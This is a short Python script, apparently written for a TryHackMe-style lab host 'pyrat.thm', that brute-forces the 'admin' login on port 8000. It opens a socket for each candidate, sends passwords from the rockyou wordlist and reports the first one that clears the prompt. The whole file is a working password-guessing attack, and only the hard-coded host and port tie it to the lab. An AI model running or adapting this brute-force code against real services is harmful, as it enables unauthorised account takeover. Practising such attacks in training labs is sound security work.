import socket

# Remote host details
host = 'pyrat.thm'
port = 8000

# Wordlist to use
wordlist = '/usr/share/wordlists/rockyou.txt'

def fuzz():
    try:
        with open(wordlist, 'r') as file:
            for line in file:
                password = line.strip()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                s.send(b'admin\n')
                
                # capture the response
                response = s.recv(1024).decode().strip()
                
                # Logic to catch the correct password
                if "password:" in response.lower():
                    print(f'Trying password: {password}')
                    s.sendall(password.encode() + b'\n')
                    # Capture the response:
                    response = s.recv(1024).decode().strip()
                    
                    if "Password:" not in response:
                        print(f'Password found: {password}')
                        break
                    
                s.close()   

    except FileNotFoundError:
            print(f'File not found')

fuzz()
